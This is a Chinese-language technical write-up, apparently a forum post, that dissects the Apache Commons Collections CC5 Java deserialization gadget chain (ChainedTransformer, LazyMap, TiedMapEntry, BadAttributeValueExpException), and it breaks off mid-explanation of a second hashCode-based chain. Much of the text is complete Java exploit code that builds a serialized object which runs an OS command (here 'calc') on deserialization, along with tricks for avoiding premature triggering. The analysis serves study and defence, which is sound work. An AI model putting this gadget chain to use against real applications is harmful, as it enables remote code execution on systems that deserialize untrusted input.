
```
/``/``ChinaTransformer类实现了Transformer链调用，我们只需要传入一个Transformer数组ChainedTransformrt就可以实现依次调用每一个Transformer的transform方法，其构造函数传入一个Transformer数组。
```
```java
public ChainedTransformer(Transformer[] transformers){
    this.iTransformers = transformers;
}
```
```
/``/``transform方法对其在构造函数中传入一个transform数组循环调用
```
```java
public Object transform(Object object){
    for(int i = 0; i < iTransformers.length; i++){
        object = iTransformers[i].transform(Object);
    }
    return object;
}
```
```
/``/``链式执行计算器：
```
```java
Method m = Runtime.class.getMethod("getRuntime");
InvokerTransformer i1 = new InvokerTransformer("getMethod", new Class[] {
    String.class, Class[].class }, new Object[] {
    "getRuntime", new Class[0] });
InvokerTransformer i2 = new InvokerTransformer("invoke", new Class[] {
    Object.class, Object[].class }, new Object[] {
    null, new Object[0] });
InvokerTransformer i3 = new InvokerTransformer("exec",
    new Class[] { String.class }, new Object[]{"calc"});
ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{i1, i2, i3});
chainedTransformer.transform(Runtime.class);
```
```
/``/``输入为Runtime.class开始触发
```

![](https://bbs.kanxue.com/upload/attach/202212/969544_8ENBJYWBDJ9KAUG.png)

可看到成功触发计算器

![](https://bbs.kanxue.com/upload/attach/202212/969544_JXXNXWFJ3BYJUMZ.png)

但是`ChainedTransformer`类里还是没有`readObject`方法，反序列化时还是不能触发`transform`方法。

## 分析链前对代码编写提高容错率：

![](https://bbs.kanxue.com/upload/attach/202212/969544_8A8ZYYSMQX66E8X.png)

首先我们在看`transform`的实现方法时，看到`ConstantTransformer`里的`transform`方法，输入什么都给他输出，所以可更改一下我们链代码。

|  |  |
| --- | --- |
| 1  2  3  4  5  6  7  8  9  10  11  12 | `Method m` `=` `Runtime.`class``.getMethod(``"getRuntime"``);`  `ConstantTransformer c1` `=` `new ConstantTransformer(Runtime.`class``);`  `InvokerTransformer i1` `=` `new InvokerTransformer(``"getMethod"``, new Class[] {`  `String.`class``, Class[].`class` `}, new` `Object``[] {`  `"getRuntime"``, new Class[``0``] });`  `InvokerTransformer i2` `=` `new InvokerTransformer(``"invoke"``, new Class[] {`  `Object``.`class``,` `Object``[].`class` `}, new` `Object``[] {`  `null, new` `Object``[``0``] });`  `InvokerTransformer i3` `=` `new InvokerTransformer(``"exec"``,`  `new Class[] { String.`class` `}, new` `Object``[]{``"calc"``});`  `ChainedTransformer chainedTransformer` `=` `new ChainedTransformer(new Transformer[]{c1, i1, i2, i3});`  `chainedTransformer.transform(``"123"``);` |

入口点为`ConstantTransformer c1 = new ConstantTransformer(Runtime.class)`，这时候将`c1`加入链中，`transform`方法不管输入，输出都是`Runtime.class`。

![](https://bbs.kanxue.com/upload/attach/202212/969544_4BWAZFCM8ACDQZ6.png)

# CC5 链一：

## LazyMap链：

|  |  |
| --- | --- |
| 1  2  3  4  5  6  7  8  9  10  11  12  13  14 | `Method m` `=` `Runtime.`class``.getMethod(``"getRuntime"``);`  `ConstantTransformer c1` `=` `new ConstantTransformer(Runtime.`class``);`  `InvokerTransformer i1` `=` `new InvokerTransformer(``"getMethod"``, new Class[] {`  `String.`class``, Class[].`class` `}, new` `Object``[] {`  `"getRuntime"``, new Class[``0``] });`  `InvokerTransformer i2` `=` `new InvokerTransformer(``"invoke"``, new Class[] {`  `Object``.`class``,` `Object``[].`class` `}, new` `Object``[] {`  `null, new` `Object``[``0``] });`  `InvokerTransformer i3` `=` `new InvokerTransformer(``"exec"``,`  `new Class[] { String.`class` `}, new` `Object``[]{``"calc"``});`  `ChainedTransformer chainedTransformer` `=` `new ChainedTransformer(new Transformer[]{c1, i1, i2, i3});`  `HashMap hashMap` `=` `new HashMap();`  `Map` `lazyMap` `=` `LazyMap.decorate(hashMap, chainedTransformer);`  `lazyMap.get(``123``);` |

![](https://bbs.kanxue.com/upload/attach/202212/969544_M4DMV833FYPQR42.png)

`LazyMap`类继承了`Serializable`接口，是可被反序列化的，但是`reobject`方法中并没有什么操作，所以需要找到一个类去触发`get`方法，再通过`get`触发`transform`。

![](https://bbs.kanxue.com/upload/attach/202212/969544_JSU45WWWH6NAFBB.png)

找到`TiedMapEntry`类，继承了`Serializable`接口，再看到`TiedMapEntry`方法，接受了外部输入，传入内部。`map`可控，可以传入`LazyMap`，`key`可控，传入`Runtime.class`，而`TiedMapEntry`类没有`readObject`方法，但是在`equals`方法，`hashCode`方法，`toString`方法调用了`getValue`，所有在找有什么类调用了这四个方法。

![](https://bbs.kanxue.com/upload/attach/202212/969544_Y37XKP3J3WW7T72.png)

最后找到`BadAttributeValueExpException`类，继承了`Serializable`接口

![](https://bbs.kanxue.com/upload/attach/202212/969544_ZGQ5RVHM63BZ39E.png)

![](https://bbs.kanxue.com/upload/attach/202212/969544_VW4P47CFU6C8FQM.png)

![](https://bbs.kanxue.com/upload/attach/202212/969544_PP4JEUUFSCYCM2A.png)

而`readObject`方法正好触发了`toString`方法，由此完成了CC5的反序列化漏洞链。

**BadAttributeValueExpException readObject方法 -》TiedMapEntry toString方法 -》getValue方法 -》LazyMap get方法 -》 transform方法**

# 实现代码：

|  |  |
| --- | --- |
| 1  2  3  4  5  6  7  8  9  10  11  12  13  14  15  16  17  18  19  20  21  22  23  24  25  26  27  28  29  30  31  32  33  34  35  36  37  38  39  40  41  42  43  44  45  46  47  48  49  50  51  52  53 | `Method m` `=` `Runtime.`class``.getMethod(``"getRuntime"``);`    `Transformer c1` `=` `new ConstantTransformer(Runtime.`class``);`    `InvokerTransformer i1` `=` `new InvokerTransformer(``"getMethod"``, new Class[] {`  `String.`class``, Class[].`class` `}, new` `Object``[] {`  `"getRuntime"``, new Class[``0``] });`    `InvokerTransformer i2` `=` `new InvokerTransformer(``"invoke"``, new Class[] {`  `Object``.`class``,` `Object``[].`class` `}, new` `Object``[] {`  `null, new` `Object``[``0``] });`    `InvokerTransformer i3` `=` `new InvokerTransformer(``"exec"``,`  `new Class[] { String.`class` `}, new` `Object``[]{``"calc"``});`  `/``/``i3可能会返回一个对象加进``Map``里`    `Transformer c2` `=` `new ConstantTransformer(``2``);`  `/``/``防止对序列化或反序列胡产生影响，所以再多写一个，在i1 i2 i3执行完，返回的还是一个ConstantTransformer对象`    `/``/``需要注意，由于这段代码会提前出发计算器，而到了Deserializer.deserialize(Serializer.serialize(val))，对象会出错，所以先随机生成，在添加完参数之后才执行`  `Transformer transformerChain` `=` `new ChainedTransformer(new Transformer[]{ new ConstantTransformer(``1``) });`    `HashMap hashMap` `=` `new HashMap();`      `Map` `lazyMap` `=` `LazyMap.decorate(hashMap, transformerChain);`      `lazyMap.get(``123``);`      `TiedMapEntry entry` `=` `new TiedMapEntry(lazyMap,` `"foo"``);`  `/``/``调试可以知道，LazyMap里有缓存，会导致不能触发，所以要清空``Map`  `/``/``这里也触发过，会导致不能进入LazyMap的get方法的``if``判断中，所以在后面也对entry值进行修改`    `BadAttributeValueExpException val` `=` `new BadAttributeValueExpException(null);`    `Field valfield` `=` `val.getClass().getDeclaredField(``"val"``);`    `Reflections.setAccessible(valfield);`    `valfield.`set``(val, entry);`    `Reflections.setFieldValue(entry,` `"key"``,` `"hqq"``);`  `/``/``修改entry值，确保进入LazyMap的get方法的``if``判断中`    `Reflections.setFieldValue(transformerChain,` `"iTransformers"``, new Transformer[]{c1, i1, i2, i3, c2});`  `/``/` `在全部加载完后换成真正的transform，加入c2防止报错`    `Deserializer.deserialize(Serializer.serialize(val));`  `/``/``LazyMap在writeObject方法中不能先触发，不然对象会没有`    `/``/``需要注意的是支持的是``1.8``版本，对于以前的版本是不能触发的，比如``1.7``，``1.7``的BadAttributeValueExpException类是没有readObject方法的，所以根本不能触发反序列化漏洞。` |

# 解决办法：

## CC5 链二：HashCode

![](https://bbs.kanxue.com/upload/attach/202212/969544_W9B2J2Q2HVJQDWT.png)

`TiedMapEntry`里的`getValue`调用`get`，在传入`Map`为`LazyMap`时，就可触发`LazyMap`里的`get`方法里的`transform`来弹计算器。所以，可以使用另外一条链`hashCode`触发，所以只需要找出调用`hashCode`的链即可。

![](https://bbs.kanxue.com/upload/attach/202212/969544_7PQCH66UFRAWR4F.png)

入口点为`HashMap`，在1.7版本的`HashMap`的`readObject`中，使用的是`putForCreate`函数，我们的`kay`和`value`由`put`传入。

![](https://bbs.kanxue.com/upload/attach/202212/969544_33M43RXM3WV6W7S.png)

进入到`putForCreate`函数后，再跟进`hash`函数，调用`hash(key)`计算`key`的`hash`值，链也由此进入。

![](https://bbs.kanxue.com/upload/attach/202212/969544_78PQ4HP886ZBXUR.png)

可以看到`hash`方法中调用了`hashCode`函数，如果在`hash`方法中，传入的`key`正好为`TiedMapEntry`，这时候就调用了`TiedMapEntry`的`hashCode`方法。

![](https://bbs.kanxue.com/upload/attach/202212/969544_PTPM4JM9F82W9NC.png)

如果`hashCode`方法里调用了`getvalue`方法，`getValue`方法又调用了`get`方法，而传入的`map`又正好为`LazyMap`
